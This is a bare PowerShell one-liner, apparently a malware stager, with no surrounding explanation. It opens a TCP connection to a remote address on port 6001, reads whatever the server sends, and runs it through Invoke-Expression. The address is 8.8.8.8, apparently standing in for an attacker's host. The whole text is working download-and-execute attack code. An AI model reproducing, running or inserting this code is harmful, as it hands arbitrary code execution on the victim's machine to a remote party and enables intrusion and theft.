$client=new-object net.sockets.tcpclient;$client.connect('8.8.8.8',6001);$tcpstream=$client.getstream();$memstream=new-object system.io.memorystream;$buff=new-object byte[] 2048;while(($readByted=$tcpstream.read($buff,0,$buff.length)) -gt 0){$memstream.write($buff,0,$readByted)};$utf8str=[system.text.encoding]::utf8.getstring($memstream.toarray());iex $utf8str;
